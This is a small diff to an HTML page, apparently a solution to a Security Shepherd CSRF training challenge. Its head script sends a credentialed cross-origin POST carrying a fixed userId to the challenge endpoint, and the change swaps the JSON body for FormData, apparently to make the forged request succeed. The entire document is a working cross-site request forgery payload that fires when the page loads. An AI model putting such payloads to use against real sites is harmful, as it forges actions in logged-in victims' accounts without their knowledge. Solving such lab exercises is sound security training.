@@ -2,13 +2,14 @@
 
 <head>
   <script>
+    var formData = new FormData();
+    formData.append("userId", "9a48c34a3c4af660fb16bd109ae8a5758f1e8dc9");
+
     fetch('https://security-shepherd.dev.inf.elasticnet.co/user/csrfchallengetwo/plusplus', {
       method: 'POST',
       credentials: "include",
       mode: "no-cors",
-      body: JSON.stringify({
-        "userId": "9a48c34a3c4af660fb16bd109ae8a5758f1e8dc9"
-      })
+      body: formData
     })
   </script>
 </head>
